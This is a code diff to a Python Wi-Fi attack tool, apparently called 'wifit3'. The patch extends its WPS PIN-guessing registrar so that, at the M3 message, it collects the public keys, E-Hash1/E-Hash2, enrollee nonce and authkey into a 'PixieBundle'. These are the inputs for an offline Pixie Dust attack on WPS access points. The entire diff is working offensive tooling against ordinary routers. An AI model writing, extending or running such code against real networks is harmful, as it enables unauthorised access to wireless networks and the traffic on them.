@@ -25,6 +25,7 @@ from dataclasses import dataclass
 from enum import Enum
 from typing import Callable, Optional, Protocol
 
+from wifit3.campaigns.wps.pixie import PixieBundle
 from wifit3.dot11.wsc import messages as M
 from wifit3.dot11.wsc import crypto as wc
 
@@ -58,6 +59,7 @@ class AttemptOutcome:
     via_timeout: bool = False             # result inferred from silence (timeout-as-NACK), not a real NACK
     refused: bool = False                 # AP actively refused external-registrar WPS (disassoc /
     #                                       persistent identity-stall), NOT mere silence
+    pixie: PixieBundle | None = None
 
     @property
     def first_half_ok(self) -> bool:
@@ -187,7 +189,7 @@ class WpsRegistrar:
         r_s1 = os.urandom(wc.SECRET_NONCE_LEN)
         r_s2 = os.urandom(wc.SECRET_NONCE_LEN)
 
-        pke = nonce_e = authkey = keywrapkey = psk1 = psk2 = None
+        pke = nonce_e = mac_e = authkey = keywrapkey = psk1 = psk2 = pixie = None
         last_sent: Optional[str] = None         # 'M4' or 'M6': which answer we're waiting on
         # Highest WSC message type handled. WSC never runs backward, so a
         # received message older than this is a stale (no-ACK) retransmit. We
@@ -204,7 +206,7 @@ class WpsRegistrar:
         def _out(result: PinResult, **kw) -> AttemptOutcome:
             # Every outcome carries reached_m1 so the campaign can tell a silent AP
             # (never talked WSC) from one that rejected mid-exchange.
-            return AttemptOutcome(result, pin, reached_m1=reached_m1, **kw)
+            return AttemptOutcome(result, pin, reached_m1=reached_m1, pixie=pixie, **kw)
 
         await self._send_1x(M.eapol_start())
         self.log(f"[WPS] -> EAPOL-Start (pin {pin})")
@@ -328,6 +330,10 @@ class WpsRegistrar:
             elif mt == M.WPS_M3:
                 if authkey is None:
                     return _out(PinResult.PROTO_ERROR, detail="M3 before keys")
+                e_hash1 = p.attrs.get(M.ATTR_E_HASH1)
+                e_hash2 = p.attrs.get(M.ATTR_E_HASH2)
+                if e_hash1 and e_hash2:
+                    pixie = PixieBundle(pke, pkr, e_hash1, e_hash2, nonce_e, authkey, mac_e)
                 m4 = M.build_m4(nonce_e, r_s1, r_s2, psk1, psk2, pke, pkr,
                                 authkey, keywrapkey, p.raw_wsc_attrs)
                 await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m4))
